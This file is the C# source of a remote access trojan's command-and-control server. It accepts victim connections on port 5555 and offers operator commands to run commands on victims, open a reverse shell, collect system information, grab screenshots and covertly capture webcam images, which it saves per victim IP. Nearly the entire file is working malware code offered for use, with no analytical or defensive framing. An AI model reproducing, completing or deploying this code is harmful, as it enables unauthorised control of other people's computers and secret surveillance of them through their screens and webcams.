﻿using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Threading;
using System.Net;
using System.Net.Sockets;
using System.Collections;
using System.IO;
using System.Drawing;

namespace RATCommandControl
{
    class RATMain
    {
        static List<EndPoint> connectedEndPoints = new List<EndPoint>();
        static List<Socket> associatedHandlers = new List<Socket>();
        static void startRATListener()
        {
            string data = null;
            int port = 5555;
            byte[] incomingBytes = new byte[1024];
            IPHostEntry ipHostInfo = Dns.GetHostEntry(Dns.GetHostName());
            IPAddress ipAddress = ipHostInfo.AddressList[0];
            IPEndPoint server = new IPEndPoint(ipAddress, port);
            Socket listener = new Socket(ipAddress.AddressFamily, SocketType.Stream, ProtocolType.Tcp);
            listener.Bind(server);
            listener.Listen(10);
            while (true)
            {
                Socket handler = listener.Accept();
                data = null;
                while (true)
                {
                    incomingBytes = new Byte[1024];
                    int numBytes = handler.Receive(incomingBytes);
                    data += Encoding.ASCII.GetString(incomingBytes, 0, numBytes);
                    if(data.IndexOf((char)4) > -1)
                    {
                        break;
                    }
                }
                String replyString = "";
                if (data[0] == (char)6) //On first connect, clients send a single ACK byte
                {
                    connectedEndPoints.Add(handler.RemoteEndPoint);//Add this new client to our list of clients
                    associatedHandlers.Add(handler);
                    IPEndPoint selectedIPEndpoint = handler.RemoteEndPoint as IPEndPoint;
                    Console.WriteLine("Alert! New Endpoint: " + selectedIPEndpoint.Address.MapToIPv4().ToString()+":"+selectedIPEndpoint.Port.ToString());
                    replyString += (char)6; //Reply with a single ACK
                    
                }


                replyString += (char)4; //Append an end of field to our reply string
                byte[] encodedReplyString = Encoding.ASCII.GetBytes(replyString); //encode it
                handler.Send(encodedReplyString);

            }
        }

        static void listCurrentEndpoints()
        {
            Console.WriteLine("Current Endpoints: ");
            for(int i = 0; i < connectedEndPoints.Count; i++)
            {
                IPEndPoint selectedIPEndpoint = associatedHandlers[i].RemoteEndPoint as IPEndPoint;
                Console.WriteLine("["+i.ToString()+"]   "+selectedIPEndpoint.Address.MapToIPv4().ToString());
            }
        }

        static void conIO()
        {
            Console.WriteLine("RAT Console. 'exit' to exit.");
            List<String> commandIndex = new List<String>();
            commandIndex.Add("lce");
            commandIndex.Add("exec");
            commandIndex.Add("select");
            commandIndex.Add("unselect");
            commandIndex.Add("shell");
            commandIndex.Add("kill");
            commandIndex.Add("sysinfo");
            commandIndex.Add("screen");
            commandIndex.Add("webcam_capture");
            EndPoint selectedEndpoint = null;
            String commandString = null;
            String currentEndpointString = "no endpoint selected!";
            while (true)
            {
                Console.Write("( "+currentEndpointString+" )>> ");
                commandString = Console.ReadLine();
                if (commandString.Equals("lce"))
                {
                    listCurrentEndpoints();
                } else if (commandString.IndexOf("exec") == 0) {
                    string cmd;
                    try
                    {
                        cmd = commandString.Substring(5);
                        exec(cmd, selectedEndpoint);
                    }
                    catch(Exception e)
                    {
                        Console.WriteLine("Error while processing command to exec! aborting!");
                    }
                } else if (commandString.Equals("exit")) {
                    break;
                }else if (commandString.StartsWith("select"))
                {
                    try
                    {
                        String[] hostcmd = commandString.Split(' ');
                        int id = int.Parse(hostcmd[1]);
                        selectedEndpoint = connectedEndPoints[id];
                        IPEndPoint selectedIPEndpoint = selectedEndpoint as IPEndPoint;
                        currentEndpointString = "[" + connectedEndPoints.IndexOf(selectedEndpoint) + "] " + selectedIPEndpoint.Address.MapToIPv4().ToString();
                    }
                    catch(Exception e)
                    {
                        Console.WriteLine("An error occurred with selecting. Aborting selection.");
                    }
                }else if (commandString.Equals("unselect"))
                {
                    selectedEndpoint = null;
                    currentEndpointString = "no endpoint selected!";

                }else if (commandString.Equals("kill"))
                {
                    if(selectedEndpoint == null)
                    {
                        Console.WriteLine("Error: No endpoint selected.");
                    }else
                    {
                        killClient(selectedEndpoint);
                        selectedEndpoint = null;
                        currentEndpointString = "no endpoint selected!";
                    }
                }else if (commandString.Equals("shell"))
                {
                    if (selectedEndpoint == null)
                    {
                        Console.WriteLine("Error: No endpoint selected");
                    }
                    else
                    {
                        reverseShell(selectedEndpoint);
                    }
                }else if (commandString.Equals("sysinfo"))
                {
                    if(selectedEndpoint == null)
                    {
                        Console.WriteLine("Error: No endpoint selected");
                    }else
                    {
                        getSystemInfo(selectedEndpoint);
                    }
                }else if (commandString.Equals("screen"))
                {
                    if(selectedEndpoint == null)
                    {
                        Console.WriteLine("Error: No endpoint selected");
                    }else
                    {
                        screenGrab(selectedEndpoint);
                    }
                }else if (commandString.Equals("webcam_capture"))
                {
                    if(selectedEndpoint == null)
                    {
                        Console.WriteLine("Error: No endpoint selected");
                    }else
                    {
                        captureWebcam(selectedEndpoint);
                    }
                }



                else
                {
                    Console.WriteLine("Known commands: ");
                    foreach(String command in commandIndex)
                    {
                        Console.WriteLine(command);
                    }
                }
            }
            Environment.Exit(0xbeef);
            
            
        }
        static void captureWebcam(EndPoint e)
        {
            int endpointIndex = connectedEndPoints.IndexOf(e);
            Socket usingSock = associatedHandlers.ElementAt(endpointIndex);
            String query = "c4m";
            query += (char)4;
            byte[] queryBytes = Encoding.ASCII.GetBytes(query);
            usingSock.Send(queryBytes);
            byte[] recvChunk = new byte[1024];
            String recvString = null;
            List<byte> imgBytes = new List<Byte>();
            bool error = false;
            while (true)
            {
                int recvSize = usingSock.Receive(recvChunk);
                recvString = Encoding.ASCII.GetString(recvChunk, 0, recvSize);
                foreach (byte b in recvChunk)
                {
                    imgBytes.Add(b);
                }
                if (recvString.IndexOf("IEND") > -1)
                {
                    break;
                }
                else if (recvString.IndexOf("webcamError") > -1)
                {
                    error = true;
                    break;
                }
        }
            if (!error)
            {
                var ms = new MemoryStream(imgBytes.ToArray());
                Image img = Image.FromStream(ms);
                IPEndPoint clientIPEndpoint = usingSock.RemoteEndPoint as IPEndPoint;
                System.IO.Directory.CreateDirectory("webcam_" + clientIPEndpoint.Address.MapToIPv4().ToString());
                img.Save(Environment.CurrentDirectory + "\\webcam_" + clientIPEndpoint.Address.MapToIPv4().ToString() + "\\screenshot" + DateTime.Now.Ticks.ToString() + ".png", System.Drawing.Imaging.ImageFormat.Png);
                img.Dispose();
                ms.Dispose();
            }
            else{
                Console.WriteLine("An error occurred while processing data from the webcam.");
            }
            
        }
        static void screenGrab(EndPoint e) //Slight memory leak here...
        {
            int endpointIndex = connectedEndPoints.IndexOf(e);
            Socket usingSock = associatedHandlers.ElementAt(endpointIndex);
            String query = "y0ink";
            query += (char)4;
            byte[] queryBytes = Encoding.ASCII.GetBytes(query);
            usingSock.Send(queryBytes);
            byte[] recvChunk = new byte[1024];
            String recvString = null;
            List<byte> imgBytes = new List<Byte>();
            
            while (true)
            {
                int recvSize = usingSock.Receive(recvChunk);
                recvString = Encoding.ASCII.GetString(recvChunk, 0, recvSize);
                foreach(byte b in recvChunk)
                {
                    imgBytes.Add(b);
                }
                if (recvString.IndexOf("IEND") > -1)
                {
                    break;
                }
                
            }
            Console.WriteLine("broke loop.");
            var ms = new MemoryStream(imgBytes.ToArray());
            Image img = Image.FromStream(ms);
            IPEndPoint clientIPEndpoint = usingSock.RemoteEndPoint as IPEndPoint;
            System.IO.Directory.CreateDirectory("screenshots_" + clientIPEndpoint.Address.MapToIPv4().ToString());
            img.Save(Environment.CurrentDirectory + "\\screenshots_" + clientIPEndpoint.Address.MapToIPv4().ToString() + "\\screenshot" + DateTime.Now.Ticks.ToString() + ".png", System.Drawing.Imaging.ImageFormat.Png);
            img.Dispose();
            ms.Dispose();
            
        }
        static void getSystemInfo(EndPoint e)
        {
            Socket usingSocket = associatedHandlers[connectedEndPoints.IndexOf(e)];
            String queryString = "inf0";
            queryString += (char)4;
            packAndSend(queryString, e);
        }
        static void killClient(EndPoint clientEndpoint)
        {
            String packetToSend = null;
            packetToSend += "ki||";
            packetToSend += (char)4;
            packAndSend(packetToSend, clientEndpoint);
            int clientIndex = connectedEndPoints.IndexOf(clientEndpoint);
            connectedEndPoints.Remove(clientEndpoint);
            associatedHandlers.RemoveAt(clientIndex);
        }

        //Maybe encrypt all these transmissions at some point?
        static void packAndSend(string toSend, EndPoint endpoint)
        {
            try
            {
                byte[] reply = new byte[1024];
                string sendString = toSend.ToString();
                sendString += (char)4; //The pack part of pack and send: Append an EOF byte
                byte[] sendBytes = Encoding.ASCII.GetBytes(sendString);
                int endpointID = connectedEndPoints.IndexOf(endpoint);
                associatedHandlers[endpointID].Send(sendBytes);
                int replySize = associatedHandlers[endpointID].Receive(reply);
                String replyString = Encoding.ASCII.GetString(reply, 0, replySize);
                while (replyString.IndexOf((char)4) == -1)
                {
                    replySize = associatedHandlers[endpointID].Receive(reply);
                    replyString += Encoding.ASCII.GetString(reply, 0, replySize);
                }
                Console.WriteLine(replyString);
            }catch(Exception e)
            {
                Console.WriteLine("An error occurred in communications with one or more clients.");
            }
            
        }

        //For future encryption of traffic: the reverseShell method DOES NOT use the packAndSend method;
        //Its traffic will have to be individually encrypted.
        static void reverseShell(EndPoint e)
        {
            Socket selectedSocket = associatedHandlers[connectedEndPoints.IndexOf(e)];
            String reverseShellHandshakeStart = "rev3rs3";
            reverseShellHandshakeStart += (char)4;
            byte[] handshakeStartBytes = Encoding.ASCII.GetBytes(reverseShellHandshakeStart);
            selectedSocket.Send(handshakeStartBytes);
            byte[] stdRecv = new byte[1024];
            while (true)
            {
                stdRecv = new byte[1024];
                String stdString = "";
                while (true)
                {
                    int byteCount = selectedSocket.Receive(stdRecv);
                    stdString += Encoding.ASCII.GetString(stdRecv, 0, byteCount);
                    if (stdString.IndexOf((char)4) > -1)
                    {
                        break;
                    }
                }
                Console.WriteLine(stdString);
                Console.Write(">$>");
                String stdin = Console.ReadLine();
                byte[] stdinBytes = Encoding.ASCII.GetBytes(stdin);
                selectedSocket.Send(stdinBytes);
                if (stdin.ToLower().Equals("exit"))
                {
                    break;
                }
            }
            Console.WriteLine("Terminating remote shell...");
        }
        //Real simple: Run command on endpoint
        static void exec(String command, EndPoint selectedEndpoint)
        {
            Console.WriteLine("Processing exec...");
            if (selectedEndpoint == null)
            {
                Console.WriteLine("Error: Selected endpoint was null. ");
                return;
            }
            String packetToSend = null;
            packetToSend += "3><3[ ";
            packetToSend += command;
            packAndSend(packetToSend, selectedEndpoint);
            
        }
        static void Main(string[] args)
        {
            Thread listenerThread = new Thread(startRATListener);
            listenerThread.Start();
            Thread conIOThread = new Thread(conIO);
            conIOThread.Start();
        }
    }
}
